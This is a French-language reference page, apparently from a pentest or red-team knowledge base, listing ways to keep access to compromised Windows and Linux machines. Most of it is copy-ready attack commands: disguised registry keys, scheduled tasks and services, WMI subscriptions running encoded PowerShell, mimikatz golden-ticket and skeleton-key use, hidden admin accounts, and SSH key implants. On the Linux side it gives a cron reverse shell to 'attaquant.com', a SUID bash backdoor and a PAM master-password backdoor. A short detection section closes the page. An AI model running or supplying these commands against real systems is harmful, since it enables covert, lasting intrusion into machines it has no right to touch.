---
title: Persistence
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [persistence, windows, linux, backdoor, sécurité, pentest, red-team]
date: 2026-03-22
---

# Persistence

La persistance consiste à maintenir un accès à un système compromis après un redémarrage ou une reconnexion. Un attaquant réel ne veut pas re-exploiter une vulnérabilité à chaque fois.

## Windows — Mécanismes de persistance

### Registre — Run Keys

```powershell
# Démarrage avec chaque session utilisateur
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Démarrage pour tous les utilisateurs (nécessite admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# RunOnce — exécuté une seule fois au prochain démarrage
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Update /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Temp\update.ps1" /f

# Clés moins surveillées
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
# Userinit = C:\Windows\system32\userinit.exe, C:\backdoor.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Temp\payload.exe" /f
```

### Tâches planifiées

```powershell
# Tâche planifiée toutes les heures
schtasks /create /tn "Windows Update" /tr "C:\Temp\payload.exe" /sc hourly /f

# Au démarrage du système
schtasks /create /tn "SystemCheck" /tr "powershell.exe -WindowStyle Hidden -File C:\Temp\persist.ps1" /sc onstart /ru System /f

# À la connexion d'un utilisateur
schtasks /create /tn "UserLogin" /tr "C:\Temp\payload.exe" /sc onlogon /f

# Tâche déguisée (imitation d'une tâche légitime)
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\AUScheduledInstall" /tr "C:\Temp\payload.exe" /sc daily /st 03:00 /f

# PowerShell — plus discret
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -EncodedCommand <base64>"
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "SecurityHealthMonitor" -Trigger $trigger -Action $action -RunLevel Highest -Force
```

### Services Windows

```powershell
# Créer un service (persistance SYSTEM)
sc create "WindowsDefenderSvc2" binpath= "cmd.exe /c start /b C:\Temp\payload.exe" start= auto
sc start "WindowsDefenderSvc2"

# Modifier un service existant (si droits suffisants)
sc config wuauserv binpath= "C:\Temp\payload.exe"
sc start wuauserv
```

### DLL Hijacking (persistance)

```
Si une application légitime chargée au démarrage cherche une DLL dans un répertoire modifiable,
placer une DLL malveillante à cet endroit → exécution à chaque démarrage de l'application.

Méthode de détection :
1. Sysinternals Process Monitor → filtrer sur "NAME NOT FOUND" + ".dll"
2. Identifier les DLL recherchées dans des répertoires accessibles en écriture
3. Placer une DLL backdoorée à cet emplacement
```

### WMI Subscriptions

Méthode plus discrète que les Run Keys (pas visible avec les outils standard).

```powershell
# Créer un Event Filter (condition de déclenchement)
$filterArgs = @{
    Name = 'FiltreSysteme'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs

# Créer un Event Consumer (action à exécuter)
$consumerArgs = @{
    Name = 'ConsommateurSystème'
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -EncodedCommand <base64>"
}
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

# Lier le filter et le consumer
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter = [ref]$filter
    Consumer = [ref]$consumer
}

# Vérification et nettoyage
Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding
Remove-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Name='ConsommateurSystème'"
```

### COM Hijacking

```powershell
# Trouver des CLSID dans HKCU (modifiable sans admin) absents dans HKLM
# → Priorité HKCU > HKLM dans la résolution COM

# Procmon : filtrer sur "HKCU\Software\Classes\CLSID" + "NAME NOT FOUND"
# Identifier des CLSID d'applications qui s'exécutent au démarrage

# Enregistrer un faux serveur COM dans HKCU
reg add "HKCU\Software\Classes\CLSID\{CLSID_CIBLÉ}\InprocServer32" /ve /t REG_SZ /d "C:\Temp\backdoor.dll" /f
# → Quand l'application tente de charger ce COM → charge notre DLL
```

### Golden/Silver Ticket (persistance Kerberos)

```powershell
# Golden Ticket — TGT forgé avec le hash KRBTGT
# Persiste tant que le hash KRBTGT n'est pas réinitialisé (recommandé : 2 fois)
# Durée par défaut : 10 ans
mimikatz# kerberos::golden /user:Administrator /domain:domaine.local /sid:S-1-5-21-... /krbtgt:<hash> /endin:525600 /renewmax:262800

# Skeleton Key (dangereuse — persiste seulement jusqu'au redémarrage du DC)
# Injecte un mot de passe universel dans LSASS du DC
mimikatz# misc::skeleton
# → Tous les utilisateurs peuvent maintenant s'authentifier avec le mot de passe "mimikatz"
```

### Compte admin local caché

```powershell
# Créer un compte administrateur discret
net user supportdesk P@ssw0rd! /add
net localgroup administrators supportdesk /add

# Masquer le compte de l'écran de connexion
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v supportdesk /t REG_DWORD /d 0 /f
```

## Linux — Mécanismes de persistance

### Cron jobs

```bash
# Cron utilisateur (exécuté en tant que l'utilisateur compromis)
(crontab -l; echo "* * * * * /tmp/.hidden/payload > /dev/null 2>&1") | crontab -

# Cron système (nécessite root)
echo "*/5 * * * * root /opt/.svc/payload" >> /etc/crontab
echo "@reboot root bash -i >& /dev/tcp/attaquant.com/4444 0>&1" >> /etc/crontab

# Via cron.d
cat > /etc/cron.d/updates << 'EOF'
*/10 * * * * root /usr/local/sbin/update-check
EOF
```

### Clé SSH autorisée

```bash
# Ajouter une clé SSH publique (accès persistant sans mot de passe)
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Pour root (si compromis)
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### Fichiers de démarrage shell

```bash
# Persistance via .bashrc (exécuté à chaque shell bash interactif)
echo "nohup /tmp/.payload &" >> ~/.bashrc

# .profile (exécuté à la connexion)
echo "/tmp/.payload &" >> ~/.profile

# /etc/profile.d/ (tous les utilisateurs, nécessite root)
cat > /etc/profile.d/sysupdate.sh << 'EOF'
#!/bin/bash
nohup /usr/local/sbin/sysupdate > /dev/null 2>&1 &
EOF
chmod +x /etc/profile.d/sysupdate.sh
```

### Services systemd

```bash
# Créer un service systemd (nécessite root ou systemd user)
cat > /etc/systemd/system/sysmon.service << 'EOF'
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/sysmon
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sysmon
systemctl start sysmon
```

### SUID Backdoor

```bash
# Copier bash avec le bit SUID (nécessite root pour créer, mais n'importe qui pour exécuter)
cp /bin/bash /tmp/.bash_hidden
chmod u+s /tmp/.bash_hidden
# Plus tard : /tmp/.bash_hidden -p → shell root

# Autre option : SUID sur python3
chmod u+s /usr/bin/python3
# → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### PAM Backdoor

```bash
# Modifier /etc/pam.d/sshd pour accepter un mot de passe universel
# Ajouter au début de /etc/pam.d/common-auth :
auth sufficient pam_exec.so /tmp/check_auth.sh

# check_auth.sh
#!/bin/bash
read -r password
if [ "$password" = "backdoor_password" ]; then
    exit 0  # Authentification réussie pour n'importe quel compte
fi
exit 1
```

## Contre-mesures et détection

```
Windows :
  Surveiller : Run keys, tâches planifiées, nouveaux services, WMI subscriptions
  Outils : Autoruns (Sysinternals) — liste TOUT ce qui démarre automatiquement
  Sysmon events : 13 (RunKey modifiée), 12 (WMI filter créé)
  Event 4698/4702 : tâche planifiée créée/modifiée

Linux :
  Vérifier crontab de tous les utilisateurs : for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l; done
  Chercher les SUID récents : find / -perm -u=s -newer /bin/ls 2>/dev/null
  Vérifier les clés SSH autorisées : find / -name authorized_keys 2>/dev/null
  Services systemd récents : systemctl list-units --type=service --state=active
  Fichiers cachés : find / -name ".*" -not -path "/proc/*" 2>/dev/null | head
```
